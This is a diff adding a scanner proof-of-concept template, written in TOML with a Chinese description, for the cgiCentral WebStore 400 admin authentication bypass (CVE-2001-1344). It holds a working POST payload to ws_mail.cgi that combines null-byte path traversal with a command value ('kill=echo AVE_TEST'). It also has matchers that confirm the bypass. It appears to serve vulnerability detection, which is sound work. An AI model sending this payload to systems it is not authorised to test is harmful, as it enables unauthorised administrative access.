@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "通过向 ws_mail.cgi 发送包含空字节截断的 userfile 参数，绕过管理员身份认证，验证目标是否存在 cgiCentral WebStore 400 认证绕过漏洞"
+id = "POC-AVE-2001-0538"
+name = "cgiCentral WebStore 400 管理员身份认证绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2001-0538"]
+vuln_id = [
+    "CVE-2001-1344",
+    "AVE-2001-0538",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/ws_mail.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "userfile=../Statistics/WebStore_Access.counter%00&kill=echo+AVE_TEST&terminate=whatever&admin=yep&restart=pls&msgfile=../../Statistics/WebStore_Access.counter"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "Mozilla/4.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "Administrator",
+    "WebStore",
+]
